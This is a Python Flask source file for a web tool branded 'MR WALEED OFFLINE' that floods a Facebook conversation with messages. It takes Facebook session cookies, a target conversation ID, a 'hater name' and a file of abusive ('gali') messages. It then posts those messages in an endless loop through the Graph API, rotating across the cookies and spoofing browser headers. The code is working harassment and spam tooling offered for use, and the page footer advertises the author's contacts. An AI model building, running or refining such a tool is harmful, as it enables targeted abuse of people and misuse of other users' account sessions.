from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

stop_events = {}
threads = {}
active_tasks = {}

def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    active_tasks[task_id] = "Running"
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
            for cookie in cookies_list:
                if stop_event.is_set():
                    break
                try:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    
                    # Create session with cookies
                    session = requests.Session()
                    
                    # Parse cookie string into dictionary
                    cookie_dict = {}
                    for c in cookie.strip().split(';'):
                        if '=' in c:
                            key, value = c.strip().split('=', 1)
                            cookie_dict[key] = value
                    
                    # Add cookies to session
                    session.cookies.update(cookie_dict)
                    session.headers.update(headers)
                    
                    parameters = {'message': message}
                    response = session.post(api_url, data=parameters)
                    
                    if response.status_code == 200:
                        print(f"Message Sent Successfully From cookie: {message}")
                    else:
                        print(f"Message Sent Failed From cookie. Status: {response.status_code}")
                    time.sleep(time_interval)
                except Exception as e:
                    print(f"Error: {e}")
                    time.sleep(2)
    
    active_tasks[task_id] = "Stopped"

@app.route('/', methods=['GET', 'POST'])
def send_message():
    stop_key = None
    message = ""
    
    if request.method == 'POST':
        # Check if this is a stop request
        if 'stopTask' in request.form:
            task_id = request.form.get('taskId')
            if task_id in stop_events:
                stop_events[task_id].set()
                message = f'Task with ID {task_id} has been stopped.'
            else:
                message = f'No task found with ID {task_id}.'
        else:
            # This is a start request
            cookie_option = request.form.get('cookieOption')

            if cookie_option == 'single':
                cookies_list = [request.form.get('singleCookie')]
            else:
                cookie_file = request.files['cookieFile']
                cookies_list = cookie_file.read().decode().strip().splitlines()

            thread_id = request.form.get('threadId')
            mn = request.form.get('kidx')
            time_interval = int(request.form.get('time'))

            txt_file = request.files['txtFile']
            messages = txt_file.read().decode().splitlines()

            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

            stop_events[task_id] = Event()
            thread = Thread(target=send_messages, args=(cookies_list, thread_id, mn, time_interval, messages, task_id))
            threads[task_id] = thread
            thread.start()

            stop_key = task_id
            message = f'Task started with ID: {task_id}'

    return render_template_string('''
    <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>☠️❣️👇MR WALEED OFFLINE 👇❣️☠️</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    label { color: white; animation: fadeIn 1s; }
    .file { height: 30px; animation: bounce 2s infinite; }
    body {
      background-image: url('https://i.ibb.co/TBtHnkzK/62dfe1b3d1a831062d951d680bced0e6.jpg');
      background-size: cover;
      background-repeat: no-repeat;
      color: white;
      animation: fadeIn 2s;
    }
    .container {
      max-width: 350px; 
      height: auto;
      border-radius: 20px;
      padding: 20px;
      box-shadow: 0 0 15px white;
      animation: zoomIn 2s;
    }
    .form-control {
      outline: 1px red;
      border: 1px double white;
      background: transparent;
      width: 100%;
      height: 40px;
      padding: 7px;
      margin-bottom: 20px;
      border-radius: 10px;
      color: white;
      animation: slideInLeft 1s;
    }
    .header { 
      text-align: center; 
      padding-bottom: 20px; 
      animation: bounceInDown 2s;
    }
    .btn-submit { 
      width: 100%; 
      margin-top: 10px;
      animation: pulse 2s infinite;
    }
    .footer { 
      text-align: center; 
      margin-top: 20px; 
      color: #888; 
      animation: fadeInUp 2s;
    }
    .whatsapp-link {
      display: inline-block;
      color: #25d366;
      text-decoration: none;
      margin-top: 10px;
      animation: zoomInUp 2s;
    }
    .whatsapp-link i { margin-right: 5px; }
    .stop-key-box {
      text-align: center;
      background-color: rgba(0, 0, 0, 0.7);
      border: 2px solid white;
      color: #00ff00;
      font-weight: bold;
      padding: 20px;
      margin-top: 30px;
      border-radius: 15px;
      animation: bounceInDown 1.5s;
    }
    .message-box {
      text-align: center;
      background-color: rgba(0, 0, 0, 0.7);
      border: 2px solid #ff0000;
      color: #ff9900;
      font-weight: bold;
      padding: 15px;
      margin-top: 20px;
      border-radius: 10px;
      animation: fadeIn 1s;
    }
    .active-tasks {
      background-color: rgba(0, 0, 0, 0.7);
      border: 2px solid #00ff00;
      color: #00ff00;
      padding: 15px;
      margin-top: 20px;
      border-radius: 10px;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    @keyframes bounce {
      0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
      40% { transform: translateY(-10px); }
      60% { transform: translateY(-5px); }
    }

    @keyframes zoomIn {
      from { transform: scale(0.5); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    @keyframes slideInLeft {
      from { transform: translateX(-100%); }
      to { transform: translateX(0); }
    }

    @keyframes bounceInDown {
      from { transform: translateY(-2000px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes zoomInUp {
      from { opacity: 0; transform: translateY(200px) scale(0.7); }
      to { opacity: 1; transform: translateY(0) scale(1); }
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">☠️❤️ 👇MR WALEED OFFLINE 👇❤️☠️</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="cookieOption" class="form-label">Select Cookie Option</label>
        <select class="form-control" id="cookieOption" name="cookieOption" onchange="toggleCookieInput()" required>
          <option value="single">Single Cookie</option>
          <option value="multiple">Cookie File</option>
        </select>
      </div>
      <div class="mb-3" id="singleCookieInput">
        <label for="singleCookie" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝘾𝙊𝙊𝙆𝙄𝙀..⤵️</label>
        <input type="text" class="form-control" id="singleCookie" name="singleCookie">
      </div>
      <div class="mb-3" id="cookieFileInput" style="display: none;">
        <label for="cookieFile" class="form-label">Choose Cookie File</label>
        <input type="file" class="form-control" id="cookieFile" name="cookieFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝘾𝙊𝙉𝙑𝙊 𝙐𝙄𝘿...⤵️</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙃𝘼𝙏𝙀𝙍 𝙉𝘼𝙈𝙀...⤵️</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙎𝙋𝙀𝙀𝘿...⤵️ (seconds)</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙂𝘼𝙇𝙄 𝙁𝙄𝙇𝙀..⤵️</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">☠️ 𝙍𝙐𝙉𝙄𝙉𝙂 𝙎𝙀𝙍𝙑𝙀𝙍 ☠️</button>
    </form>
    
    {% if stop_key %}
    <div class="stop-key-box">
      YOUR STOP KEY:<br><span style="font-size: 22px;">{{ stop_key }}</span>
    </div>
    {% endif %}
    
    {% if message %}
    <div class="message-box">
      {{ message }}
    </div>
    {% endif %}
    
    <div class="active-tasks">
      <h5>Active Tasks:</h5>
      {% for task_id, status in active_tasks.items() %}
        <div>Task ID: {{ task_id }} - Status: {{ status }}</div>
      {% else %}
        <div>No active tasks</div>
      {% endfor %}
    </div>
    
    <form method="post">
      <input type="hidden" name="stopTask" value="true">
      <div class="mb-3 mt-4">
        <label for="taskId" class="form-label">𝙀𝙉𝙏𝙀𝙍 𝙎𝙏𝙊𝙋 𝙆𝙀𝙔..⤵️</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit mt-3">❤️ 𝙎𝙏𝙊𝙋 𝙎𝙀𝙍𝙑𝙀𝙍 ❤️</button>
    </form>
  </div>
  <footer class="footer">
    <p>☠️❣️👇MR WALEED OFFLINE 👇❣️☠️</p>
    <p><a href="https://www.facebook.com/officelwaleed">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+923150596250" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i>💫 𝘾𝙃𝘼𝙏 𝙊𝙉 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋 💫
      </a>
    </div>
  </footer>
  <script>
    function toggleCookieInput() {
      var cookieOption = document.getElementById('cookieOption').value;
      if (cookieOption == 'single') {
        document.getElementById('singleCookieInput').style.display = 'block';
        document.getElementById('cookieFileInput').style.display = 'none';
      } else {
        document.getElementById('singleCookieInput').style.display = 'none';
        document.getElementById('cookieFileInput').style.display = 'block';
      }
    }
    
    // Auto-refresh page every 10 seconds to update task status
    setTimeout(function() {
      location.reload();
    }, 10000);
  </script>
</body>
</html>
''', stop_key=stop_key, message=message, active_tasks=active_tasks)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
